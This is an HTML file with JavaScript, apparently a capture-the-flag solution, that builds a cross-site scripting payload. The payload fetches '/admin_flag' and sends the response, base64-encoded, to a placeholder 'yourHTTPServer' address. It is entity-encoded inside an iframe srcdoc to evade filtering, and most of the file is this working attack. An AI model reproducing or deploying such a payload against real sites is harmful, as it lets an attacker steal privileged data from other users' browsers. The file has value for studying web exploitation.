<!--
  Reference: https://ourcodeworld.com/articles/read/188/encode-and-decode-html-entities-using-pure-javascript
-->


<script>
  (function(window){
    window.htmlentities = {
      /**
       * Converts a string to its html characters completely.
       *
       * @param {String} str String with unescaped HTML characters
       **/
      encode : function(str) {
        var buf = [];
        
        for (var i=str.length-1;i>=0;i--) {
          buf.unshift(['&#', str[i].charCodeAt(), ';'].join(''));
        }
        
        return buf.join('');
      },
      /**
       * Converts an html characterSet into its original character.
       *
       * @param {String} str htmlSet entities
       **/
      decode : function(str) {
        return str.replace(/&#(\d+);/g, function(match, dec) {
          return String.fromCharCode(dec);
        });
      }
    };
  })(window);

  payload = `
    <script>
      function reqListener () {
        var yourHTTPServer = "http://127.0.0.1"
        window.location = yourHTTPServer+"/?data="+btoa(this.responseText);
      };

      var oReq = new XMLHttpRequest();
      oReq.onload = reqListener;
      oReq.open("get", "/admin_flag", true);

      setTimeout(() => {oReq.send(); }, 2000);
    <\/script>
  `
  
  console.log("<iframe srcdoc="+htmlentities.encode(payload)+"></iframe>")
</script>
